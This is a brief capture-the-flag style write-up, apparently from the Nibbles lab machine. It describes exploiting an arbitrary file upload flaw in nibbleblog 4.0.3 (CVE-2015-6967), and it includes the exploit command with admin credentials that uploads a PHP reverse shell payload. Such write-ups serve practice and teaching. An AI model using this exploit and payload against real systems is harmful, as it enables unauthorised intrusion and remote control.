Gained initial foothold into the machine as user `nibbler` using the arbitrary file upload vulnerability that exists in nibbleblog v4.0.3

- Found an exploit to upload php-reverse-shell.php payload and execute it. [GitHub](https://github.com/dix0nym/CVE-2015-6967)
- Running the exploit
```bash
python exploit.py --url 'http://10.10.10.75/nibbleblog/' -u 'admin' -p 'nibbles' -x ../php-reverse-shell.php
```
Got reverse shell
![[Pasted image 20240831190946.png]]

